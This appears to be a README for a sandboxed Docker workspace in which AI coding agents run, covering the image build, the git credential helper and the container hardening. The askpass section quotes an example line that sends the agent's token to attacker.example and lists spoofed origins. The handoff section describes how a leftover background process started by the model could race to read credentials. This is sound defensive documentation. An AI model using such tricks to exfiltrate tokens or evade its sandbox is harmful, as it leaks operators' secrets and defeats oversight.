# Workspace image

The disposable container an agent works inside: one per chat, one per scheduled run. It is created
by `DockerWorkspaceRunner` (`packages/core/src/runner/docker/`), never by compose, and it is
destroyed together with everything written into it.

## What is in the image

|                   |                                                                                                                                                                                          |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Base              | `node:24-bookworm-slim`                                                                                                                                                                  |
| Tools             | `git`, `ca-certificates`, `ripgrep`, `jq`, `python3`, `build-essential`, `curl`, `corepack` (pnpm, yarn)                                                                                 |
| User              | `agent`, uid 1001, non-root                                                                                                                                                              |
| Working directory | `/workspace`, owned by `agent` — where the repository is cloned                                                                                                                          |
| Runtime directory | `/opt/agent-runtime`, **root-owned and read-only to `agent`** — holds `askpass.sh` and the agent runtime bundle                                                                          |
| Handoff directory | `/opt/agent-runtime/handoff`, mode `0700` and owned by `agent` — where the host places the credentials of one turn, and the only thing under `/opt/agent-runtime` that `agent` may write |
| Git configuration | `credential.helper=""`, `GIT_ASKPASS=/opt/agent-runtime/askpass.sh`, `GIT_TERMINAL_PROMPT=0`, `init.defaultBranch=main`, `/workspace` marked a safe directory                            |
| Idle command      | `CMD ["sleep", "infinity"]` — the container idles and the worker `exec`s turns into it                                                                                                   |

`CMD` rather than `ENTRYPOINT` so `docker run "$WORKSPACE_IMAGE" node --version` still works for
diagnostics while the runner's `exec` path is unaffected.

The image contains **no secrets, no `.env` and no source of this repository** other than the runtime
bundle. Credentials do not arrive as container environment: they are placed as a file in the handoff
directory immediately before each turn's runtime process starts, and the runtime reads them once and
unlinks the file before the agent runs anything — see [askpass and the token
file](#askpass-and-the-token-file).

## Build

```bash
pnpm infra:image   # builds this instance's tag: agent-hangar/workspace:<instance>
```

The tag carries the instance, the way the database name and the container prefix do, so a rebuild in
one checkout cannot decide what another checkout's next container is created from. `WORKSPACE_IMAGE`
exported in the shell still names the tag to build — the end-to-end harness builds the image of the
instance it is about to run — but nothing derives a tag two instances share.

There is no bare `docker build -t <tag> infra/workspace` equivalent, for two reasons: the runtime
bundle below is staged into the build context by `pnpm infra:image` itself, not by Docker, so a bare
build fails on a fresh clone that has no `runtime/` directory yet; and the build argument
`AH_WORKSPACE_DIGEST` would be empty, which leaves the image carrying no digest and therefore
unusable — `pnpm dev`, the doctor and the end-to-end pre-step all read that label to decide whether
the image matches the tree they were started from, and an image that cannot be shown to match one is
refused. `infra/scripts/setup.sh` goes through `pnpm infra:image` for the same reasons.

The build ends by asking Docker what the tag resolves to and failing if it is not the digest it meant
to write. A build whose every layer is cached prints `CACHED` and exits 0, which says nothing about
which image the tag ended up on; this does.

A warm-cache rebuild takes a few seconds; a cold build is dominated by the `apt-get` layer and stays
well under three minutes.

## Runtime bundle

`/opt/agent-runtime/` will also hold the esbuild bundle of `packages/agent-runtime`. The Dockerfile
carries a placeholder for it:

```dockerfile
# --- AGENT RUNTIME BUNDLE (added by W1-D) ---
```

Two `COPY` lines are added under that marker when the agent-runtime package lands:

```dockerfile
COPY runtime/cli.js /opt/agent-runtime/cli.js
COPY runtime/cli.js.map /opt/agent-runtime/cli.js.map
```

No `--chown`: the bundle is executed by `agent` and must not be writable by it. `/opt/agent-runtime`
is root-owned for the same reason — see [Security properties](#security-properties).

`pnpm infra:image` then builds `@agent-hangar/agent-runtime` first and copies its `dist/cli.js*` into
`infra/workspace/runtime/` before the `docker build`. That folder is a build artefact: it is
`.gitignore`d here and explicitly allowed into the build context by `.dockerignore`.

## askpass and the token file

`GIT_ASKPASS` is set image-wide, so `/opt/agent-runtime/askpass.sh` answers every credential prompt
git makes inside the workspace — including the ones the agent itself triggers.

- A prompt containing `Username` is answered with `x-access-token` (GitHub's fixed username for
  token authentication).
- Any other prompt is answered with the token, read from the file named by **`AH_GIT_TOKEN_FILE`**
  and from nowhere else. The agent runtime writes that file on the container's tmpfs for the
  duration of a turn and unlinks it at the end, which is what lets git authenticate while running
  with the scrubbed environment the shell tool's children get. **There is no `GITHUB_TOKEN`
  fallback:** nothing puts the PAT in an environment any more, and a fallback to a variable would
  be a fallback to whatever the workspace chose to set — the shell tool runs a command the model
  wrote, and one assignment in front of a git command is all it would take.
- Credentials are released **only** for the origin in `/opt/agent-runtime/allowed-origin`, which
  the runner writes — root-owned, before the container starts — from the repository URL the
  workspace was created for, after measuring it against `ALLOWED_REPO_HOSTS`. The prompt is reduced
  to an origin — scheme, host and port, userinfo dropped — and compared for exact equality, so
  `github.com.evil.test`, `https://github.com@evil.test`, `https://evil.test/github.com/x` and the
  same host on another port are all refused, while a forge the operator listed on another host or
  port is served.
- **A file, not an environment variable, and the path is hard-coded.** The shell tool runs
  `bash -lc` with a command the model wrote, and a command may set any variable for the process it
  starts — so for as long as this policy lived in the environment,
  `AH_GIT_ALLOWED_ORIGIN=https://attacker.example git clone …` let the model choose where its own
  PAT was sent. `/opt/agent-runtime` is root-owned, so `agent` can read what is in it and can
  neither rewrite nor unlink it; unlink is governed by the directory's write bit, not by the file's
  owner. The container is not given the allow-list either: this helper decides from a host it reads
  out of a prompt, so a set of acceptable origins would mean a crafted prompt naming any one of
  them is answered with the token.
- The binding is **origin-level** — scheme, host and port. Another repository on the same origin is
  the same origin and is answered; the prompt does not carry a path to judge unless git is
  configured to include one.
- The approved origin must itself be `https`. `ALLOWED_REPO_HOSTS` may authorise a cleartext origin
  — the local forge a container reaches through the host gateway is why it may — but that
  authorises a clone, not a credential: a workspace created for an `http` origin clones anonymously
  and is answered nothing here.
- A missing, unreadable or empty `/opt/agent-runtime/allowed-origin` releases nothing. A container
  nobody prepared has no forge to fall back to.
- What this bounds is where the credential helper will send the PAT. It is **not** an egress
  control: the token file is readable by `agent` by design (see R1 in the root `README.md`), and
  the container has ordinary network access.
- Every refusal prints nothing on stdout and exits non-zero, so git fails authentication instead of
  reading an empty line as a valid password. An absent or empty token fails the same way.

## Where the credentials come from

The worker reveals the GitHub PAT and the OpenAI key once per turn and hands them to the container
as a single file:

|                |                                                                                 |
| -------------- | ------------------------------------------------------------------------------- |
| Path           | `/opt/agent-runtime/handoff/credentials.json`                                   |
| Content        | `{"githubToken":"…","openaiApiKey":"…"}`                                        |
| Placed by      | the runner, through Docker's archive API, immediately before the runtime `exec` |
| Owner and mode | `root:root`, `0644`, inside a `0700` directory owned by `agent`                 |
| Removed by     | the runtime, as it starts, before the agent can run anything                    |

Root ownership makes it unforgeable; the directory's ownership is what makes it **removable** —
unlink is governed by the directory's write bit, not by the file's owner — and the removal is the
whole point. A credential in the container's environment is readable through `/proc/1/environ` by
every process of the workspace for as long as the container lives, and a chat's container outlives
the turn that created it; a credential in a file that is gone by the time the agent's first command
runs is not.

The handoff directory is deliberately **not** a tmpfs. Docker's archive API writes through the
container's root filesystem on the host, so a file uploaded to a path a tmpfs is mounted over lands
underneath the mount and no process in the container ever sees it. The residual is that the bytes
touch the container's writable layer, which is removed with the container.

One window this does not cover: if the runtime is killed between the placement and the read — the
worker's exec timeout firing immediately, or the container being stopped — the file is left where
it was put. The next turn's runtime reads and unlinks whatever it finds there before the agent runs
anything, and `destroy` removes the container's storage, so it is bounded by the next turn or the
teardown rather than left indefinitely.

The window the unlink leaves open is a race, and it is worth being exact about who can enter it.
Every process in the workspace runs as `agent` — the same uid that owns the handoff directory — so
`0700` keeps out other users and the workspace has none: the shell tool can list that directory and
read what is in it. The permission bits are not what protects the credential; the unlink is. And a
turn is not the boundary a reader might assume. `run_shell` starts each command in its own process
group and kills that group on a timeout or a cancellation, but a command that exits normally after
backgrounding detached work leaves that work running, and a chat reuses its container for every
turn. So a poller left behind by an earlier turn can watch the directory and win the race against
the runtime's read. Bounding that further means keeping the credential outside the container and
mediating git from the worker — the process model R1 records as out of scope for a build the
specification requires to authenticate with a personal access token.

A runtime that cannot read the file, cannot remove it, or finds it incomplete emits
`turn.failed { code: "credentials" }` and exits non-zero rather than starting a turn with an empty
token — an empty password handed to git turns a misconfiguration into an authentication failure
against the real forge.

## Security properties

Some are baked into the image, the rest are applied by the runner at `create` time. They are listed
together because they only make sense as one posture.

| Property                                                                                                                                                                                        | Where it comes from  |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------- |
| Runs as uid 1001, never root                                                                                                                                                                    | image (`USER agent`) |
| No credential in any layer or in `Config.Env`                                                                                                                                                   | image                |
| No credential in the container's environment either — `/proc/1/environ` carries configuration only                                                                                              | runner               |
| `/opt/agent-runtime` root-owned — `agent` cannot replace `askpass.sh` or the bundle                                                                                                             | image                |
| `/opt/agent-runtime/handoff` owned by `agent`, mode `0700` — so the runtime can unlink what it reads. The mode excludes other users, and the workspace has none that matter: see the race below | image                |
| All Linux capabilities dropped (`--cap-drop ALL`)                                                                                                                                               | runner               |
| `no-new-privileges`                                                                                                                                                                             | runner               |
| CPU, memory and PIDs ceilings                                                                                                                                                                   | runner               |
| `/tmp` on a tmpfs                                                                                                                                                                               | runner               |
| No bind mount, no volume, **no Docker socket**                                                                                                                                                  | runner               |
| Bridge network (egress only, no inbound)                                                                                                                                                        | runner               |
| A real init as PID 1 (`--init`) — signals reach the process, orphans are reaped                                                                                                                 | runner               |
| Labelled `ah.instance`, `ah.workspace`, `ah.kind` for scoped discovery and reaping                                                                                                              | runner               |

The container runs code chosen by a language model reading untrusted repository content. Treat every
line above as load-bearing.

## How to verify

```bash
eval "$(bash infra/scripts/env.sh --print-effective)"                   # $WORKSPACE_IMAGE
docker run --rm "$WORKSPACE_IMAGE" id -u                               # 1001
docker image inspect "$WORKSPACE_IMAGE" --format '{{json .Config}}' | jq '.User, .WorkingDir, .Cmd, .Labels'
docker image inspect "$WORKSPACE_IMAGE" --format '{{json .Config}}' | grep -Ei 'token|secret|api_key'   # no output
bash infra/scripts/workspace-image.sh --status "$WORKSPACE_IMAGE"      # current
DOCKER_AVAILABLE=1 pnpm --filter @agent-hangar/core test:integration    # the @docker suite
```

The `@docker` suite is the real check: it creates workspaces against the local daemon and asserts the
limits, the hardening flags, the absence of mounts, filesystem isolation between two workspaces, that
the injected environment never reaches the image, and that a credential placed for one execution is
readable and removable by the workspace user and leaves nothing behind. The worker's own
`@docker @db @redis` suite goes one step further and searches a container that has just completed a
real turn for the credentials it ran with.

## Troubleshooting

| Symptom                                         | Cause and fix                                                                                                                                                         |
| ----------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `WorkspaceImageMissing`                         | The image has not been built on this host. Run `pnpm infra:image`. Nothing is ever pulled or built implicitly.                                                        |
| `cannot inspect image …`                        | The daemon is unreachable. The runner looks for it in this order: `DOCKER_HOST`, `~/.docker/run/docker.sock`, `/var/run/docker.sock`.                                 |
| `DOCKER_TLS_VERIFY is not supported …`          | The runner speaks to a unix socket or plain TCP only; point `DOCKER_HOST` at one of those.                                                                            |
| `container name already exists for workspace …` | A previous container of that workspace was never removed. `pnpm ws:list` / `pnpm ws:reap`.                                                                            |
| `workspace did not become ready`                | The container started but never accepted an exec. Check `docker logs ah-ws-<instance>-<workspaceId>`.                                                                 |
| `askpass: refusing to release credentials …`    | Working as intended: something asked for the token for a host other than the approved one.                                                                            |
| `askpass: no GitHub token available`            | The turn's token file is gone or was never written — the turn has ended, or the runtime never started. It is not a fallback to a variable; there is none.             |
| `turn.failed { code: "credentials" }`           | The credentials file was not placed, could not be removed, or was incomplete. Check the worker's log for the create, and that both credentials are saved in Settings. |
